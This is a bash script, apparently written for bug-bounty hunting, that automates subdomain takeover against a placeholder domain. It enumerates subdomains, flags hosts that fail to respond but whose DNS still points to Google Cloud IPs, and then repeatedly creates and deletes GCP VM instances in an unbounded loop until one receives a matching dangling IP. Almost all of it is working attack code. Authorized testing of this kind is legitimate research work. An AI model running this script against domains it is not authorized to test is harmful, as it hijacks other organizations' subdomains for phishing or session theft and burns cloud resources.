#!/bin/bash
# Update needed tools before script execution
subfinder -update
httpx -update

# Run subfinder to check for new subdomains if any...
subfinder -provider-config /root/.config/subfinder/provider-config.yaml -d foo.com | anew /opt/foo/foo.com.txt > /opt/foo/added-lines.txt
wordcount=$(wc -l < /opt/foo/added-lines.txt)
if [[ $wordcount -ge 1 ]]
then
        #Add Newly discovered subdomains to foo.com.txt. appended... >> so that we don't see old new subdomains being found over and over.
        cat /opt/foo/added-lines.txt >> /opt/foo/foo.com.txt
else
        echo "Doing nothing" >/dev/null 2>&1
fi

httpxfoo=$(httpx -l /opt/foo/foo.com.txt -probe -ip | grep -i "failed" | sed -E 's/^\s*.*:\/\///g' | cut -f1 -d"[")

for i in $httpxfoo
do
digfoo=$(dig +short "$i")
if [[ $digfoo ]]
then
        nslookupfoo=$(nslookup "$digfoo" | grep -i "googleusercontent")
        if [[ $nslookupfoo && $digfoo ]]
        then
                echo "Found potential candidate(s) for Subdomain Takeover: "
                echo "$digfoo,$i" >> /opt/foo/potential_candidates.txt
        else
                echo "No IP addresses are pointing to any Google assets" >/dev/null 2>&1
        fi
else
        echo "No IP addresses returned" >/dev/null 2>&1
fi
done

grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" /opt/foo/potential_candidates.txt > /opt/foo/IP_only.txt
target_IPS=$(cat /opt/foo/IP_only.txt)
wordcount2=$(wc -l < /opt/foo/IP_only.txt)

COUNT=0

while true; do
if [[ $wordcount2 -ge 1 ]]
then
        ((COUNT++))
        printf "Number of Tries: $COUNT\n"
        # Create the GCP Instance
        gcloud compute instances create subdomain-takeovers-foo \
        --project=subdomain-takeovers-foo \
        --zone=us-east1-b \
        --machine-type=e2-medium \
        --network-interface=network-tier=PREMIUM,stack-type=IPV4_ONLY,subnet=default \
        --maintenance-policy=MIGRATE \
        --provisioning-model=STANDARD \
        --service-account=000000000000-compute@developer.gserviceaccount.com \
        --scopes=https://www.googleapis.com/auth/cloud-platform \
        --tags=http-server,https-server \
        --create-disk=auto-delete=yes,boot=yes,device-name=subdomain-takeovers-foo,image=projects/debian-cloud/global/images/debian-11-bullseye-v20240110,mode=rw,size=10,type=projects/subdomain-takeovers-foo/zones/us-east1-b/diskTypes/pd-standard \
        --no-shielded-secure-boot \
        --shielded-vtpm \
        --shielded-integrity-monitoring \
        --labels=goog-ec-src=vm_add-gcloud \
        --reservation-affinity=any


        ip_response=$(gcloud compute instances describe subdomain-takeovers-foo \
        --format='get(networkInterfaces[0].accessConfigs[0].natIP)' \
        --zone=us-east1-b)

        gen_ip=$(grep $ip_response /opt/foo/IP_only.txt /opt/foo2/IP_only.txt /opt/foo/run2/IP_only.txt)
        if [[ "$gen_ip" ]]
        then
                echo "++Found a matching IP for the target at $target_IPS"
                # which has the subdomain, $i++"
        exit 0
        else
                echo "Deleting the newly generated VM instance with IP: $ip_response >>> Let's try again.\n\n"
                gcloud compute instances delete subdomain-takeovers-foo --zone=us-east1-b --verbosity=none --quiet > /dev/null 2>&1
                sleep 2
        fi
else
        echo "No potentially vulnerable subdomains for foo.com" >/dev/null 2>&1
fi
done
